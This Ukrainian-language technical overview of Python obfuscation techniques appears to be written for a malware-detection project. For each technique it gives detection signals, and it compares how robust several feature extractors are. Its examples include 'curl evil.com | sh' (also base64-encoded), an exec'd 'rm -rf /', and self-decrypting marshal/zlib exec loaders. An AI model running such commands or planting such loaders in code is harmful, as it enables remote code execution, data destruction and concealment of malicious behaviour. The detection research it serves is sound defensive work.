# Методи обфускації Python-коду

Огляд поширених технік, що використовуються для приховування справжньої поведінки Python-скриптів. Класифікація — від простих текстових трансформацій до AST-рівневих, з прикладами та сигналами для детектування.

---

## 1. Текстові / лексичні техніки

### 1.1 String encoding (Base64 / Hex / ROT13)

Літерали стрічок кодуються та декодуються в рантаймі.

```python
# Original
import os
os.system("curl evil.com | sh")

# Obfuscated
import os, base64
os.system(base64.b64decode("Y3VybCBldmlsLmNvbSB8IHNo").decode())
```

**Сигнали:** `base64.b64decode`, `bytes.fromhex`, `codecs.decode(..., 'rot13')`, високий Shannon entropy у літералах.

### 1.2 Identifier renaming (mangling)

Семантичні імена → беззмістовні (`a`, `_`, `O0O0`, юнікод-омогліфи).

```python
def _0x1(_0x2): return __import__(chr(111)+chr(115)).system(_0x2)
```

**Сигнали:** середня довжина імен, частка не-ASCII в ідентифікаторах, частка single-char names.

### 1.3 String splitting / concatenation

```python
exec("im" + "po" + "rt o" + "s; o" + "s.sys" + "tem('rm -rf /')")
```

**Сигнали:** довгі ланцюжки `+` зі стрічками, виклики `"".join([...])` зі стрічковим списком.

### 1.4 `chr()` / `ord()` arithmetic

```python
exec(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+...)
```

**Сигнали:** щільність викликів `chr/ord` на одиницю довжини.

---

## 2. Bytecode / runtime-level

### 2.1 `marshal` + `compile`

Серіалізований bytecode, що виконується через `exec(marshal.loads(...))`.

```python
import marshal
exec(marshal.loads(b'\xe3\x00\x00\x00\x00...'))
```

**Сигнали:** імпорт `marshal` + `exec`/`eval`, великий байтовий літерал.

### 2.2 `zlib` / `lzma` + `exec`

Стиснений вихідний код розпаковується і виконується.

```python
import zlib, base64
exec(zlib.decompress(base64.b64decode(b'eJx...')))
```

**Сигнали:** комбінація `zlib`/`lzma`/`bz2` + `exec`/`eval`, base64-літерал > 200 байтів.

### 2.3 Dynamic execution

`exec`, `eval`, `__import__`, `getattr` — як спосіб відкласти резолвинг символів.

```python
getattr(__import__("os"), "sy" + "stem")("...")
```

**Сигнали:** виклики `exec/eval`, `getattr` від `__import__`, `compile()` із подальшим викликом.

---

## 3. AST-level

### 3.1 Dead code injection

Вставка не-операцій, що нічого не міняють, але "розбавляють" сигнал:

```python
if False: malicious_lure()
_ = [x for x in range(0) if True]
```

**Сигнали:** недосяжний код (статичний аналіз), частка no-op виразів.

### 3.2 Control-flow flattening

Лінійна послідовність операцій → state-machine з `while True: if state == 0: ...`.

```python
state = 0
while True:
    if state == 0: x = 1; state = 1
    elif state == 1: y = x + 2; state = 2
    elif state == 2: break
```

**Сигнали:** великий single-function CFG з домінуючим `while/match`, низька cyclomatic-to-LoC ratio.

### 3.3 Opaque predicates

Завжди-істинні умови, що приховують реальну гілку:

```python
if (x*x + 1) % 2 == 1:  # завжди True для int x
    payload()
```

### 3.4 Lambda nesting / functional rewriting

Імперативний код переписується через `lambda`, `map`, `reduce`.

---

## 4. Wrapper-обфускація (packers)

### 4.1 `pyarmor`, `pyminifier`, `pyobfuscate`

Готові інструменти, що комбінують декілька технік. Часто залишають характерні маркери (`__pyarmor__`, native `.so`-stubs).

### 4.2 Self-decrypting loaders

```python
import base64, zlib, marshal
_=lambda __:exec(marshal.loads(zlib.decompress(base64.b64decode(__))))
_(b'eJxNj...')
```

**Сигнали:** одно-рядкова функція-розпакувальник, lambda + exec, ланцюжок декодерів.

---

## 5. Стійкість до feature extractors

| Техніка | TF-IDF (token) | TF-IDF (char) | AST features | Imports |
|---|---|---|---|---|
| String encoding | Падає | Тримає | Тримає | Тримає |
| Identifier renaming | Падає | Падає | Тримає (структура) | Тримає |
| `marshal`+`exec` | Маскує payload | Маскує | Тримає (на рівні wrapper) | Тримає |
| Control-flow flattening | Тримає | Тримає | Падає (топологія міняється) | Тримає |
| Dead code | Тримає (зашумлено) | Тримає | Частково | Тримає |

**Висновок:** жоден single-feature extractor не покриває всі техніки. Hybrid (char n-grams + AST + import-set) дає найкращу робастність на CPU-only setup.

---

## 6. Що використовуємо у цьому проєкті

Для етапу 4 (стрес-тест baseline) реалізуємо 5 технік:

1. **Base64 string encoding** — все, що не f-string.
2. **Identifier renaming** — random short names через AST rewrite.
3. **`marshal` + `exec` wrapper** — повний скрипт у байткод.
4. **Dead code injection** — вставка no-op statements між реальними.
5. **String splitting** — літерали → ланцюжки `+`.

Кожен скрипт обфускується незалежно кожною технікою + їх комбінаціями (random subset). Це симулює реальні adversarial-сценарії.

---

## 7. Джерела

- DataDog malicious-software-packages-dataset — реальні malware-семпли з PyPI/npm.
- Roman et al. *"Detecting Obfuscated Malware in Python Packages"* (2024).
- pyarmor docs — для розуміння industrial-grade obfuscation.
- CWE-506 (Embedded Malicious Code), CWE-94 (Code Injection).
